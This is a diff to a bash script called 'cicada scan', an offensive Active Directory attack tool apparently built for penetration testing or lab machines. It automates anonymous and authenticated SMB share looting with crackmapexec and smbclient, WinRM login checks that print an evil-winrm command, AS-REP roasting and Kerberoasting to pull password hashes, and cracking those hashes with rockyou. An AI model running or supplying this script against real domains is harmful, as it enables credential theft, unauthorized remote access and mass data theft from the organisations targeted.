@@ -5,12 +5,13 @@ username=''
 password=''
 domain=''
 target=''
-pass_wordlist='/opt/rockyou.txt'
+pass_wordlist='rockyou.txt'
 full_enabled=false
 smb_enabled=false
 kerberos_enabled=false
 ldap_enabled=false
 crack_enabled=false
+winrm_enabled=false
 
 # declare colors 
 RED="\033[1;31m"
@@ -27,27 +28,27 @@ ORANGE="\033[1;33m"
 banner(){
 	  echo " 
 	  
-██████╗██╗ ██████╗ █████╗ ██████╗  █████╗ 
-██╔════╝██║██╔════╝██╔══██╗██╔══██╗██╔══██╗
-██║     ██║██║     ███████║██║  ██║███████║
-██║     ██║██║     ██╔══██║██║  ██║██╔══██║
-╚██████╗██║╚██████╗██║  ██║██████╔╝██║  ██║
- ╚═════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
- 		by theblxckcicada
-                                           
-    ███████╗ ██████╗ █████╗ ███╗   ██╗     
-    ██╔════╝██╔════╝██╔══██╗████╗  ██║     
-    ███████╗██║     ███████║██╔██╗ ██║     
-    ╚════██║██║     ██╔══██║██║╚██╗██║     
-    ███████║╚██████╗██║  ██║██║ ╚████║     
-    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝     
-                                           "  
-                                                 
+		██████╗██╗ ██████╗ █████╗ ██████╗  █████╗ 
+		██╔════╝██║██╔════╝██╔══██╗██╔══██╗██╔══██╗
+		██║     ██║██║     ███████║██║  ██║███████║
+		██║     ██║██║     ██╔══██║██║  ██║██╔══██║
+		╚██████╗██║╚██████╗██║  ██║██████╔╝██║  ██║
+		╚═════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
+			by theblxckcicada
+										   
+		   ███████╗ ██████╗ █████╗ ███╗   ██╗     
+		   ██╔════╝██╔════╝██╔══██╗████╗  ██║     
+		   ███████╗██║     ███████║██╔██╗ ██║     
+		   ╚════██║██║     ██╔══██║██║╚██╗██║     
+		   ███████║╚██████╗██║  ██║██║ ╚████║     
+		   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝     
+"  
+																 
 }
 enum_smb(){
 	# Enumerate SMB Share Drives
 	echo -e "${ORANGE} [*] Enumerating SMB...${RESET}"
-	echo -e "${PURPLE} [!] Running Crackmapexec ${domain}${RESET}"
+	echo -e "${PURPLE} [!] Running Crackmapexec${RESET}"
 	
 	if [ -z "$username" ] || [ -z "$password" ]; then
 	    crackmapexec smb $domain -u '' -p '' --shares  > $smb_file
@@ -67,20 +68,44 @@ enum_smb(){
 	fi
 }
 
+enum_winrm(){
+	# Enumerate winrm
+	echo -e "${ORANGE} [*] Enumerating winrm...${RESET}"
+	echo -e "${PURPLE} [!] Trying to log in with winrm using Crackmapexec${RESET}"
+	
+	if ! [ -z "$username" ] && ! [ -z "$password" ]; then
+	    winrm_results=$(crackmapexec winrm $domain -u $username -p $password | awk '$5 == "[+]" {print $6}')
+	    if [ -z $winrm_results ]; then
+	    	echo -e "${RED} [-] User $username can not log in with winrm${RESET}"
+	    else 
+	    	echo -e "${GREEN} [+] User $username can log in with winrm${RESET}"
+	    	echo -e "${GREEN} [+] Login to winrm using (evil-winrm -u  $username -p $password -i $domain)${RESET}"
+	    fi
+	else 
+		echo -e "${RED} [-] User $username can not log in with winrm${RESET}"
+	fi
+}
+
 smb_conn(){
 	if [ -s $smb_file ]; then
 		# connect and get a list of share drives
-		smb_shares=$(cat $smb_file | awk '$6 == "READ" && $5 !~ /^(ADMIN\$|C\$|IPC\$)$/ {print $5}')
+		cat $smb_file | awk '$6 == "READ" && $5 !~ /^(ADMIN\$|C\$|IPC\$)$/ {print $5}' > $smb_shares
+		cd $smb_shares_directory
 		if [ -s $smb_shares ];then
 			while IFS= read -r share; do
-				echo -e "${GREEN} [+] Downloading Files From $share SMB Share...${RESET}"
-				if [ -z "$username" ] || [ -z "$password" ]; then
-					smbclient //$domain/$share  -c 'prompt OFF;recurse ON;mget *' -N
-				else
-					smbclient //$domain/$share  -c 'prompt OFF;recurse ON;mget *' -U "$username%$password"
+				if ! [ -z $share ]; then
+					echo -e "${GREEN} [+] Downloading Files From $share SMB Share...${RESET}"
+					if [ -z "$username" ] || [ -z "$password" ]; then
+						smbclient //$domain/$share  -c 'prompt OFF;recurse ON;mget *;exit;' -N
+					else
+						smbclient //$domain/$share  -c 'prompt OFF;recurse ON;mget *;exit;' -U "$username%$password"
+					fi
 				fi
+				
 			done < "$smb_shares"
+			echo -e "${GREEN} [+] Files saved to  $smb_shares_directory ${RESET}"
 		fi
+		cd $current_directory
 	fi
 }
 
@@ -116,7 +141,6 @@ enum_kerberos(){
 	echo -e "${PURPLE} [!] Running GetNPUsers.py${RESET}"
 	#Request hashes using GetNPUsers.py
 	if  [ -s $users_file ]; then
-		echo -e "${ORANGE} [*] Requesting NPUsers..${RESET}"
 		if [ -z "$username" ] || [ -z "$password" ]; then
 	    		GetNPUsers.py $domain/guest@$domain -no-pass -usersfile $users_file | grep '^$krb5asrep' > $get_np_users_file
 			if ! [ -s $get_np_users_file ] || grep -q "[-] Error" "$get_np_users_file"; then
@@ -132,7 +156,6 @@ enum_kerberos(){
 	fi
 	echo -e "${PURPLE} [!] Running GetUserSPNs.py"
 	# Request hashes using GetUserSPNs.py
-	echo -e "${ORANGE} [*] Requesting User Service Principals(UserSPNs)...${RESET}"
 	if [ -z "$username" ] || [ -z "$password" ]; then
 	    	GetUserSPNs.py $domain/$username@$domain -no-pass -request | grep '^$krb5tgs' > $get_user_spn_file
 		if ! [ -s $get_user_spn_file ]; then
@@ -203,7 +226,7 @@ remove_empty(){
 
 # Function to display display_usage information
 display_usage() {
-    echo "Usage: $0 -u 'username' -p 'password' -t 'target' -w 'wordlist' [--crack] [--shares] [--ldap] [--smb] [--full]"
+    echo "Usage: $0 -u 'username' -p 'password' -t 'target' -w 'wordlist' [--full] [--crack] [--shares] [--ldap] [--smb] [--winrm]"
     echo "Options:"
     echo "  -u     		Username for authentication"
     echo "  -p   		Password for authentication"
@@ -213,13 +236,14 @@ display_usage() {
     echo "  --ldap              Enable LDAP Enumeration"
     echo "  --smb               Enable SMB Enumeration"
     echo "  --full              Enable full mode Enumeration"
+    echo "  --winrm             Enable winrm mode Enumeration"
     echo "  --crack             Crack Found Hashes"
     echo "  -h, --help          Display this help message"
     exit
 }
 
 # Parse command-line options
-while getopts ":u:p:t:-:h" opt; do
+while getopts ":u:p:t:w:-:h" opt; do
     case $opt in
         u) username="$OPTARG" ;;
         p) password="$OPTARG" ;;
@@ -227,7 +251,7 @@ while getopts ":u:p:t:-:h" opt; do
         w) wordlist="$OPTARG" ;;
         -)
             case "${OPTARG}" in
-                kerberos|ldap|smb|full|crack) eval "${OPTARG}_enabled=true" ;;
+                kerberos|ldap|smb|full|crack|winrm) eval "${OPTARG}_enabled=true" ;;
                 *) echo "Unknown option: --${OPTARG}" >&2; exit 1 ;;
             esac
             ;;
@@ -245,13 +269,14 @@ fi
 
 
 # declare directories 
-base_directory=cicada_scan
+current_directory=`pwd`
+base_directory=$current_directory/cicada_scan
 target_directory=$base_directory/$target
 smb_directory=$target_directory/smb_results
 lookupsid_directory=$target_directory/lookupsid_results
 kerberos_directory=$target_directory/kerberos_results
 ldap_directory=$target_directory/ldap_results
-
+smb_shares_directory=$smb_directory/smb
 
 # declare file names 
 get_np_users_file=$kerberos_directory/"GetNPUsers_results.txt"
@@ -261,6 +286,8 @@ cracked_kerberos_file=$kerberos_directory/"NPUsers_cracked.txt"
 lookupsid_file=$lookupsid_directory/"lookupsid_file.txt"
 users_file=$lookupsid_directory/"users.txt"
 smb_file=$smb_directory/"share_drives.txt"
+smb_shares=$smb_directory/"share_names.txt"
+
 
 
 # Create directories if they do not exist 
@@ -275,6 +302,11 @@ fi
 if [ ! -d "$smb_directory" ];then
 	mkdir $smb_directory
 fi 
+
+if [ ! -d "$smb_shares_directory" ];then
+	mkdir $smb_shares_directory
+fi 
+
 if [ ! -d "$lookupsid_directory" ];then
 	mkdir $lookupsid_directory
 fi 
@@ -295,9 +327,11 @@ grep -q "$domain$" /etc/hosts || { echo -e "${ORANGE} [+][+] Add '$target $domai
 
 #echo -e "${ORANGE} [+][+] Add '$target $domain' to /etc/hosts" 
 if ! [ -z "$domain" ]; then
+	echo -e "${GREEN} [+] Enumerating ${ORANGE}$target${RESET} with   ${ORANGE}$domain${RESET}" 
 	if $full_enabled;then
 		enum_smb
 		smb_conn
+		enum_winrm
 		enum_lookup
 		enum_kerberos
 		crack_pass
@@ -318,6 +352,9 @@ if ! [ -z "$domain" ]; then
 	fi
 	if $ldap_enabled;then
 		enum_ldap
+	fi
+	if $winrm_enabled;then
+		enum_winrm
 	fi
 	if $crack_enabled;then
 		crack_pass
